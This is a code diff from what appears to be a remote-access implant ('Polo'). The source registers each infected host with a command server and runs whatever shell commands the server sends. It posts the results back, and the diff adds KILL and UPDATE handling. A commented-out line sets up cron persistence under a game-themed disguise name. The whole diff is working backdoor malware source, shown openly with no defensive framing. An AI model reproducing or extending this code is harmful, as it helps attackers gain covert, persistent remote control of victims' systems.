@@ -106,7 +106,7 @@ void first_infection() {
     std::vector<std::string> val = command("hostname");
     PER_IMPL_INSTR = gen_endpoint(8);
     infectedHostname = val[0];
-
+    PID = ::getppid();
     curl_post(URL, FIRST_INFECT + "/" + PER_IMPL_INSTR, infectedHostname, false);
     //command("1 * * * * /usr/local/.valorant_key_check | crontab -");
 }
@@ -137,7 +137,19 @@ void check_and_post() {
    //Iteratre through commands from server
     for (std::vector<std::string>::iterator it = cmds.begin(); it != cmds.end(); ++it) {
         postReq="";
-        std::vector<std::string> cmdRes = command(*it);
+        std::vector<std::string> cmdRes;
+        //Need to check if the instruction is a Polo specific command
+        if (*it == "KILL") {
+            std::cout << "Kill Command Issued\n";
+            if (PID) {
+                kill(PID, SIGTERM);
+            }
+        } else if (*it == "UPDATE") {
+            std::cout << "UPDATE ISSUED";
+        } else {
+            cmdRes = command(*it);
+        }
+
         //Need to iterate through the return from command incase multiple lines
         for (std::vector<std::string>::iterator nit = cmdRes.begin(); nit != cmdRes.end(); ++nit) {
             postReq+= *nit + "\n";
